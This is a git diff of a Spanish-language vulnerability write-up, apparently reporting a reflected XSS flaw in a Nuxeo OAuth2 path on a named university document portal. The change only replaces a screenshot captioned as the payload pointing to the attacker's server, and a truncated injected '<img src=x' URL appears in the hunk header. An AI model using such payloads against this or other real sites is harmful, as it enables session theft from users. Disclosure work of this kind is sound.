@@ -182,7 +182,8 @@ https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src=x%
 ```
 
 ![Payload XSS apuntando al servidor atacante]
-<img width="1741" height="194" alt="image" src="https://github.com/user-attachments/assets/96c65c03-9d6d-4919-9731-f41a839ee064" />
+<img width="1919" height="206" alt="image" src="https://github.com/user-attachments/assets/90b149e2-0d71-47cb-8cdf-4ca797f12c26" />
+
 
 
 La petición fue recibida exitosamente en el servidor del atacante.
